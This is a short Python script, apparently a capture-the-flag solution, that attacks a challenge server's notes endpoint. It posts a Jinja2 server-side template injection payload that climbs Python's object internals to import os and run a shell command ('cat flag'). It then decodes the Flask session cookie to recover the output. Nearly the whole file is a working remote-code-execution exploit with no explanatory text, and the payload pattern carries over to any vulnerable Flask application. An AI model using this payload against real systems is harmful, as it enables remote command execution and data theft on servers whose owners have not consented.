#!/usr/bin/env python3
import base64
import zlib

import requests


def anticookie(x):
    parts = x.split('.')
    if len(parts) == 3:
        return base64.urlsafe_b64decode(parts[0] + '==').decode()
    elif len(parts) == 4:
        return zlib.decompress(
            base64.urlsafe_b64decode(parts[1] + '==')).decode()
    else:
        raise Exception(x)


url = 'http://challenges2.hexionteam.com:2001'
s = requests.Session()
r = s.post(
    f'{url}/notes',
    data={
        'text': '''{{ self.__class__.__init__.__globals__.__builtins__['__import__']('os').popen('cat flag').read()}}''',
    },
)
r.raise_for_status()
print(anticookie(s.cookies['session']))

r = s.get(f'{url}/notes')
r.raise_for_status()
print(r.content.decode())
